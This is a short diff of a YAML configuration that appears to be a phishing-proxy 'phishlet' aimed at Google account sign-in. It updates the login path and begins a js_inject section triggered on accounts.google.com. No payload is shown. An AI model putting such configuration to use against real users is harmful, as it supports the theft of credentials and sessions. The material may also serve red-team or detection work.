@@ -34,7 +34,7 @@ auth_urls:
 
 login:
   domain: 'accounts.google.com'
-  path: '/Servicelogin'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 
 js_inject:
   - trigger_domains: ['accounts.google.com']
